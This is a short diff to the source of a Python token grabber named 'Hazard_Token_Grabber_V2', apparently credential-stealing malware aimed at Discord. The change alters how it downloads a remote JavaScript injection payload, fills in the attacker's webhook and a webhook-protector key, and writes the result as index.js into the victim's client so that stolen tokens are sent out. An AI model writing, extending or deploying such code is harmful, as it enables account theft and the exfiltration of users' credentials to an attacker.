@@ -210,8 +210,10 @@ class Hazard_Token_Grabber_V2(functions):
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get(self.fetchConf('injection_url')).text.replace(
-                                "%WEBHOOK%", self.webhook)
+                            if "api/webhooks" in self.webhook:
+                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook)
+                            else:
+                                f = httpx.get(self.fetchConf('injection_url')).text.replace("%WEBHOOK%", self.webhook).replace("%WEBHOOK_KEY%", self.fetchConf('webhook_protector_key'))
                             try:
                                 with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                     indexFile.write(f)
